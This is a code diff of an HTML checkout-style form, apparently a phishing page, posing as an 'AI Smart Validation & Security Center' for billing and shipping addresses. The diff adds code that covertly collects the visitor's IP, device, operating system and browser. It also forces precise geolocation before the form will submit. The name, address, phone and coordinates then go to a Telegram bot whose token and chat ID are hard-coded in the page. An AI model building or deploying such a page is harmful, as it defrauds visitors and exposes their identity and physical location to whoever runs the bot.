@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -31,19 +31,23 @@
         .btn:hover { background: #0052cc; }
         .btn-success { background: var(--success); margin-top: 20px; }
         .btn-success:hover { background: #0da36e; }
+        .btn-warning { background: #f59e0b; margin-top: 10px; }
+        .btn-warning:hover { background: #d97706; }
         
         #step-verification { display: none; }
-        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: 600; font-size: 15px; }
+        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 600; font-size: 15px; }
         .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
+        .status-error { background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; }
         .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; font-size: 15px; }
         .info-card p { margin: 6px 0; }
         .info-card strong { color: #1e293b; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- 表单页面 -->
+    <!-- Form Page -->
     <div id="step-form">
         <h2>Billing & Shipping Address</h2>
         <div class="subtitle">AI Smart Validation & Security Center</div>
@@ -91,7 +95,7 @@
             </div>
             <div class="form-group">
                 <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
-                <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="formatAndValidateZip()">
+                <input type="text" id="zipCode" placeholder="Auto-formatted" oninput="formatAndValidateZip()">
                 <div class="error-hint" id="err-zipCode">Invalid postal format for selected country</div>
             </div>
         </div>
@@ -110,18 +114,20 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- 资料确认页 -->
+    <!-- Confirmation Page -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success">✅ Information Verified Successfully</div>
+        <div id="loc-status-box" class="status-box status-error hidden">⚠️ Location permission required. Please enable location and retry.</div>
+        <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Retry Location Access</button>
 
         <div class="info-card">
-            <p><strong>👤 Recipient Name：</strong><span id="disp-name"></span></p>
-            <p><strong>🏠 Shipping Address：</strong><span id="disp-addr"></span></p>
-            <p><strong>📱 Phone Number：</strong><span id="disp-phone"></span></p>
-            <p><strong>📮 Postal Code：</strong><span id="disp-zip"></span></p>
+            <p><strong>Recipient Name:</strong> <span id="disp-name"></span></p>
+            <p><strong>Shipping Address:</strong> <span id="disp-addr"></span></p>
+            <p><strong>Phone Number:</strong> <span id="disp-phone"></span></p>
+            <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
         </div>
 
         <button class="btn btn-success" id="btn-submit" onclick="submitData()">Complete & Submit</button>
@@ -129,15 +135,15 @@
 </div>
 
 <script>
-// ✅ Telegram 配置（已填好）
+// ========== Telegram Configuration ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
 
-// 国家数据库 —— 新增国家只需在这里加一条即可
+// ========== Country Database ==========
 const globalDatabase = {
     "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, states: ["Beijing","Tianjin","Shanghai","Chongqing","Hebei","Shanxi","Liaoning","Jilin","Heilongjiang","Jiangsu","Zhejiang","Anhui","Fujian","Jiangxi","Shandong","Henan","Hubei","Hunan","Guangdong","Hainan","Sichuan","Guizhou","Yunnan","Shaanxi","Gansu","Qinghai","Taiwan","Inner Mongolia","Guangxi","Tibet","Ningxia","Xinjiang","Hong Kong","Macau"] },
     "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-?\d{4})?$/, zipFormat: "5 digits or 5-4", phoneRegex: /^\d{10}$/, states: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia","Puerto Rico","Guam"] },
-    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A1A1 (auto space & upper)", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
+    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
     "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\d[A-Z]{2}$/i, zipFormat: "Postcode", phoneRegex: /^\d{10,11}$/, states: ["England","Scotland","Wales","Northern Ireland"] },
     "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, states: ["New South Wales","Victoria","Queensland","Western Australia","South Australia","Tasmania"] },
     "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{7}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, states: ["Hokkaido","Tokyo","Kanagawa","Osaka","Kyoto","Okinawa"] },
@@ -149,8 +155,12 @@ const globalDatabase = {
     "OTHER": { name: "Other Regions", phoneCode: "+00", zipRegex: /^[A-Z0-9]+$/i, zipFormat: "Postal Code", phoneRegex: /^\d+$/, states: ["Standard Region"] }
 };
 
+// ========== Global State ==========
 let formData = {};
+let deviceInfo = { ip: "Detecting...", device: "Unknown", os: "Unknown", browser: "Unknown" };
+let locationInfo = { lat: null, lng: null, status: "pending" }; // pending | granted | denied | error
 
+// ========== Initialize ==========
 window.onload = () => {
     const sel = document.getElementById('countrySelect');
     Object.keys(globalDatabase).sort((a,b)=>globalDatabase[a].name.localeCompare(globalDatabase[b].name)).forEach(code=>{
@@ -158,8 +168,11 @@ window.onload = () => {
         opt.value=code; opt.textContent=globalDatabase[code].name;
         sel.appendChild(opt);
     });
+    // Collect device info on load
+    deviceInfo = parseUserAgent();
 };
 
+// ========== Country Change ==========
 function onCountryChange() {
     const code = document.getElementById('countrySelect').value;
     const stateSel = document.getElementById('stateSelect');
@@ -182,43 +195,31 @@ function onCountryChange() {
     aiValidateField('countrySelect');
 }
 
-// ✅ 邮编专用格式化：自动去空格 + 自动大写 + 加拿大自动加空格
+// ========== ZIP Format & Validation ==========
 function formatAndValidateZip(){
     const input = document.getElementById('zipCode');
     const raw = input.value;
-
-    // 1. 去除所有空格，转大写
     let cleaned = raw.replace(/\s+/g, '').toUpperCase();
-
-    // 2. 如果是加拿大，自动格式化为 A1A 1A1 样式
     const countryCode = document.getElementById('countrySelect').value;
     if(countryCode === 'CA' && cleaned.length === 6){
         cleaned = cleaned.slice(0,3) + ' ' + cleaned.slice(3);
     }
-
-    // 3. 更新输入框（光标防跳位）
     const pos = input.selectionStart;
     input.value = cleaned;
     input.selectionStart = input.selectionEnd = pos;
-
-    // 4. 校验（用纯无空格版本去匹配正则）
     return aiValidateZipCode(cleaned.replace(/\s+/g,''));
 }
 
-// ✅ 邮编校验：无视空格，统一用无空格大写串校验
 function aiValidateZipCode(cleanedZip){
     const countryCode = document.getElementById('countrySelect')?.value || '';
     const errEl = document.getElementById('err-zipCode');
     const inputEl = document.getElementById('zipCode');
     let ok = true;
-
     if(countryCode && globalDatabase[countryCode]){
         ok = globalDatabase[countryCode].zipRegex.test(cleanedZip);
     } else {
         ok = cleanedZip.length > 0;
     }
-
-    // 显示状态
     if(cleanedZip){
         inputEl.classList.toggle('valid', ok);
         inputEl.classList.toggle('invalid', !ok);
@@ -230,6 +231,7 @@ function aiValidateZipCode(cleanedZip){
     return ok;
 }
 
+// ========== Field Validation ==========
 function aiValidateField(fid){
     const el=document.getElementById(fid); if(!el)return true;
     const v=el.value.trim();
@@ -250,17 +252,14 @@ function aiValidateField(fid){
     return ok;
 }
 
-function proceedToVerification(){
+// ========== Go to Confirm Page ==========
+async function proceedToVerification(){
     const fields=['firstName','lastName','countrySelect','stateSelect','address','city','phone'];
     const bad=fields.filter(f=>!aiValidateField(f));
-    // 单独校验邮编（已在 formatAndValidateZip 里处理）
     const zipOk = formatAndValidateZip();
-    
-    if(bad.length || !zipOk)return alert('⚠️ Please check highlighted fields before proceeding.');
+    if(bad.length || !zipOk)return alert('Please check highlighted fields before proceeding.');
 
-    // 收集纯无空格大写邮编用于提交
-    const rawZip = document.getElementById('zipCode').value.replace(/\s+/g,'').toUpperCase();
-
+    // Collect form data
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
         countryCode: document.getElementById('countrySelect').value,
@@ -268,33 +267,135 @@ function proceedToVerification(){
         state: document.getElementById('stateSelect').value,
         address: document.getElementById('address').value.trim(),
         city: document.getElementById('city').value.trim(),
-        zipDisplay: document.getElementById('zipCode').value,   // 显示用带空格
-        zip: rawZip,                                          // 提交用纯文本
+        zipDisplay: document.getElementById('zipCode').value,
+        zip: document.getElementById('zipCode').value.replace(/\s+/g,'').toUpperCase(),
         phonePrefix: document.getElementById('phonePrefix').value,
         phone: document.getElementById('phone').value.trim()
     };
 
+    // Switch page
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
 
+    // Show user info only (clean page)
     document.getElementById('disp-name').textContent = formData.name;
     document.getElementById('disp-addr').textContent = 
-        `国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}`;
+        `Country: ${formData.countryName}, Province/State: ${formData.state}, City: ${formData.city}, Street: ${formData.address}`;
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
     document.getElementById('disp-zip').textContent = formData.zipDisplay;
+
+    // Request location + IP in background
+    await Promise.all([
+        requestLocation(),
+        fetchIPAddress()
+    ]);
 }
 
+// ========== Location Request ==========
+function requestLocation(){
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            locationInfo.status = "error";
+            showLocationError();
+            return resolve();
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                locationInfo.lat = pos.coords.latitude.toFixed(6);
+                locationInfo.lng = pos.coords.longitude.toFixed(6);
+                locationInfo.status = "granted";
+                hideLocationError();
+                resolve();
+            },
+            (err) => {
+                if(err.code === 1){
+                    locationInfo.status = "denied";
+                } else {
+                    locationInfo.status = "error";
+                }
+                showLocationError();
+                resolve();
+            },
+            { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+        );
+    });
+}
+
+function showLocationError(){
+    document.getElementById('loc-status-box').classList.remove('hidden');
+    document.getElementById('btn-retry-loc').classList.remove('hidden');
+}
+
+function hideLocationError(){
+    document.getElementById('loc-status-box').classList.add('hidden');
+    document.getElementById('btn-retry-loc').classList.add('hidden');
+}
+
+// ========== Fetch IP Address ==========
+async function fetchIPAddress(){
+    try{
+        const res = await fetch('https://api.ipify.org?format=json');
+        const json = await res.json();
+        deviceInfo.ip = json.ip;
+    }catch{
+        deviceInfo.ip = "Unavailable";
+    }
+}
+
+// ========== Parse Device Info ==========
+function parseUserAgent(){
+    const ua = navigator.userAgent;
+    let device = "Unknown Device", os = "Unknown OS", browser = "Unknown Browser";
+
+    if(/iPhone/.test(ua)) device = "iPhone";
+    else if(/iPad/.test(ua)) device = "iPad";
+    else if(/Macintosh/.test(ua)) device = "Mac";
+    else if(/Android/.test(ua)) {
+        const m = ua.match(/;\s*([a-zA-Z0-9_\s-]+)\s*Build\//);
+        device = m ? m[1] : "Android Device";
+    } else if(/Windows NT/.test(ua)) device = "Windows PC";
+
+    if(/Windows NT 10/.test(ua)) os = "Windows 10/11";
+    else if(/Mac OS X/.test(ua)) os = "macOS";
+    else if(/Android/.test(ua)) os = "Android";
+    else if(/iPhone|iPad/.test(ua)) os = "iOS";
+    else if(/Linux/.test(ua)) os = "Linux";
+
+    if(/Edg\//.test(ua)) browser = "Microsoft Edge";
+    else if(/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = "Google Chrome";
+    else if(/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = "Safari";
+    else if(/Firefox\//.test(ua)) browser = "Firefox";
+
+    return {device, os, browser};
+}
+
+// ========== Submit to Telegram ==========
 async function submitData(){
-    const msg = `📩 新提交的资料
+    // BLOCK if location missing — REQUIRED
+    if(locationInfo.status !== "granted"){
+        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nMessage: Not authorized / Failed to retrieve.");
+        return;
+    }
+
+    // Build Telegram message: User Info + Device + IP + Location
+    const locText = `${locationInfo.lat}, ${locationInfo.lng}`;
+    const msg = `📩 New Submitted Information
 ——————————————
-👤 收件人姓名：${formData.name}
-🏠 收货地址：国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}
-📱 手机号码：${formData.phonePrefix} ${formData.phone}
-📮 邮政编码：${formData.zipDisplay}
-⏰ 提交时间：${new Date().toLocaleString('zh-CN')}
+👤 Recipient Name: ${formData.name}
+🏠 Shipping Address: Country: ${formData.countryName}, Province/State: ${formData.state}, City: ${formData.city}, Street: ${formData.address}
+📱 Phone Number: ${formData.phonePrefix} ${formData.phone}
+📮 Postal Code: ${formData.zipDisplay}
+
+🔍 Device & Network Info:
+• IP Address: ${deviceInfo.ip}
+• Device / Model: ${deviceInfo.device}
+• Operating System: ${deviceInfo.os}
+• Browser: ${deviceInfo.browser}
+• Coordinates: ${locText}
+⏰ Submitted: ${new Date().toLocaleString('en-US')}
 ——————————————`;
 
-    console.log('📤 准备发送到 Telegram：\n', msg);
+    console.log('📤 Sending to Telegram:\n', msg);
 
     try{
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
@@ -302,21 +403,20 @@ async function submitData(){
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: msg,
-                parse_mode:'HTML'
+                text: msg
             })
         });
         const json=await res.json();
         if(json.ok){
-            alert('✅ 提交成功！资料已发送至 Telegram。');
-            console.log('Telegram 响应：',json);
+            alert('Submitted successfully! Information sent to Telegram.');
+            console.log('Telegram response:', json);
             location.reload();
         }else{
-            alert('❌ Telegram 错误：'+JSON.stringify(json));
+            alert('Telegram Error: '+JSON.stringify(json));
             console.error(json);
         }
     }catch(e){
-        alert('❌ 网络或配置错误：'+e.message+'\n建议部署到 HTTPS 网站后提交。');
+        alert('Network or configuration error: '+e.message+'\nPlease deploy to HTTPS website.');
         console.error(e);
     }
 }
